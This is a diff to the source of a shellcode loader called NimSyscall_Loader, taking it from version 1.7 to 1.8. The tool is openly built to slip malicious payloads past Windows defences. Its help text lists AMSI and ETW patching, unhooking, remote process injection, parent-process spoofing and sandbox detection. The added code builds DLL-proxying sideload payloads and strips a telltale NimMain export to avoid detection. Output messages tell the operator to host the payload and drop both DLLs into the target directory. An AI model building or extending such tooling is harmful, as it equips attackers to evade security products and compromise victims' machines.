@@ -51,7 +51,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.7                                            
+                                                                 v1.8                                            
 
 """
 
@@ -60,10 +60,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.7
+NimSyscall_Loader v 1.8
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -77,7 +77,7 @@ Options:
   --key key     Key to encrypt with
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
-  --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
+  --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
   --noETW    Don't use ETW Patch
   --noAMSI    Don't patch AMSI
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
@@ -91,18 +91,20 @@ Options:
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
 
-[Shellcode retrieval options]
+[Payload retrieval options]
 
-  By default, the Loader will embed the Shellcode into the output file. There are two alternatives to this:  
-  --shellcodeFile shellcodefileLocation(s)    Filename to retrieve shellcode from - on Runtime (No embedding). The first location will also be the output file location. You can specify multiple locations, separated by a comma.
-  --shellcodeURL shellcodeURL    URL to retrieve shellcode from
+  By default, the Loader will embed the Payload into the output file. There are two alternatives to this:  
+  --shellcodeFile shellcodefileLocation(s)    Filename to retrieve Payload from - on Runtime (No embedding). The first location will also be the output file location. You can specify multiple locations, separated by a comma.
+  --shellcodeURL shellcodeURL    URL to retrieve Payload from
 
 [DLL options]
 
   --dll     Generate DLL instead of an executable
       --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions for e.g. DLL-Sideloading
       --dllhijack    Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking
-      --clone value    Specify a local DLL to clone the API-Exports from
+      --noNimMain    Remove NimMain export to avoid this IoC (Use "--dllhijack" in addition to instead export DllMain or alternatively "--dllexportfunc DllMain")
+      --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
+      --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
       --cpl    Generate a CPL file (Control Panel Applet) instead of an executable
 
 [evasion]
@@ -194,6 +196,8 @@ var
     dllhijack: bool = false
     dllclone: bool = false
     dllToClone: string = ""
+    dllProxy: bool = false
+    noNimMain: bool = false
     cpl: bool = false
     replaceNimMain: bool = false
     big: bool
@@ -261,11 +265,11 @@ var
     sleepycrypt: bool = false
     fluctuate: bool = false
     noDInvoke: bool = false
-    noRES: bool = true
+    metadata: bool = false
     antidebug: bool = false
     remoteMapSection: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.7")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.8")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -330,6 +334,13 @@ if args["--dllexportfunc"]:
 if args["--dllhijack"]:
   dllhijack = true
 
+if args["--dllProxy"]:
+  dllProxy = true
+  dllhijack = true
+
+if args["--noNimMain"]:
+  noNimMain = true
+
 if args["--clone"]:
     dllclone = true
     # NetClone will only work, when DllMain is exposed and leading to NimMain
@@ -369,8 +380,8 @@ if args["--output"]:
   let outname = args["--output"]
   outfile = fmt"{outname}"
 
-if args["--noRES"]:
-  noRES = false
+if args["--metadata"]:
+  metadata = true
 
 if args["--remotepatchAMSI"]:
   remoteAMSIpatch = true
@@ -1740,7 +1751,28 @@ if (debugMode):
     stub = stub.replace("import strenc", "")
 
 writeFile("Loader.nim", stub)
-echo "Written Loader.nim, compiling -> \n\n"
+echo "Written Loader.nim -> \n\n"
+
+var randValue: string = rndStr(8)
+if(dllProxy):
+    # No Support for multiple DLL files at the moment. So the last one found will be used.
+    var paths: seq[string] = @[]
+    when system.hostOS == "windows":
+        for path in walkFiles(fmt"{packerpath}\\build\\*.dll"):
+            paths.add path
+    else:
+        for path in walkFiles(fmt"{packerpath}/build/*.dll"):
+            paths.add path
+    if paths == @[]:
+        echo fmt"No DLL files found in the {packerpath}/build/ folder. You need to put the legit DLL to proxy into this directory. Exiting..."
+        quit(1)
+    for dllpath in paths:
+        when system.hostOS == "windows":
+            echo os.execShellCmd(fmt"copy {dllpath} {packerpath}\\{randValue}.dll")
+            echo os.execShellCmd(fmt"{packerpath}\\dllProxy\\gen_def.exe {randValue}.dll > {packerpath}/build/{randValue}.def")
+        else:
+            echo exec_cmd_ex(fmt"cp {dllpath} {packerpath}/{randValue}.dll")
+            echo exec_cmd_ex(fmt"python {packerpath}/dllProxy/gen_def.py {randValue}.dll > {packerpath}/build/{randValue}.def")
 
 
 # --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
@@ -1786,6 +1818,12 @@ elif system.hostOS == "windows":
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
+if(dllProxy):
+    when system.hostOS == "windows":
+        basicCompileFlags.add(fmt" --passl:{packerpath}\\build\\{randValue}.def ")
+    else:
+        basicCompileFlags.add(fmt" --passl:{packerpath}/build/{randValue}.def ")
+
 if(denim):
     basicCompileFlags.add("-d:denim ")
 
@@ -1797,6 +1835,12 @@ if(wait):
 
 if(blockDLLs):
     basicCompileFlags.add("-d:blockDLLs ")
+
+if (noNimMain):
+    when system.hostOS == "windows":
+        basicCompileFlags.add(fmt"--passl:{packerPath}\\dllProxy\nonimmain.def ")
+    else:
+        basicCompileFlags.add(fmt"--passl:{packerPath}/dllProxy/nonimmain.def ")
 
 if (retrieveFromURL):
     if(shellcodeURL.contains("https")):
@@ -1824,7 +1868,7 @@ if embeddedArguments:
 if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
 
-if (noRES and (not compileX86)): # compiled .o files only work for x64, didnt compile for x86 so far
+if (metadata and (not compileX86)): # compiled .o files only work for x64, didnt compile for x86 so far
     if (dll_out or cpl):
         when system.hostOS == "windows":
             basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
@@ -2010,3 +2054,6 @@ if (pump):
 
 if (retrieveFromURL):
     echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
+
+if (dllProxy):
+    echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
